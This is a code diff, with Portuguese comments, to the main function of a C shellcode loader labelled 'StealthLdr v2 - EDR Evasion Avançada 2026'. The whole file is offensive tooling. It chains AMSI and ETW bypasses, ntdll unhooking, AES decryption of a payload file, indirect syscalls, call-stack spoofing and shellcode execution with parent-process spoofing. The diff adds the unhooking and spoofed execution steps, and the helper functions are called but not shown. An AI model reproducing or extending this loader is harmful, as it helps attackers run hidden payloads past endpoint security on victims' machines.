@@ -13,18 +13,18 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    printf("[+] StealthLdr iniciado - EDR Evasion 2026\n");
+    printf("[+] StealthLdr v2 - EDR Evasion Avançada 2026\n");
 
-    // Evasões iniciais
+    // Evasões
     PatchlessAMSI_Bypass();
     PatchlessETW_Bypass();
+    UnhookNtdllBasic();
 
-    // Ler shellcode encriptado
+    // Carregar e descriptografar
     SIZE_T encSize = 0;
     PBYTE encrypted = ReadEncryptedFile(argv[1], &encSize);
     if (!encrypted) return 1;
 
-    // Descriptografar
     SIZE_T shellSize = 0;
     PBYTE shellcode = AES_Decrypt(encrypted, encSize, &shellSize);
     free(encrypted);
@@ -34,16 +34,13 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Setup indirect syscalls
     InitIndirectSyscalls();
-
-    // Spoof stack
     SpoofCallStack();
 
-    // Injetar e executar
-    ExecuteShellcode(shellcode, shellSize);
+    // Execução avançada com PPID Spoofing
+    ExecuteShellcodeAdvanced(shellcode, shellSize);
 
     free(shellcode);
-    printf("[+] Execução concluída.\n");
+    printf("[+] Shellcode executado com sucesso!\n");
     return 0;
 }
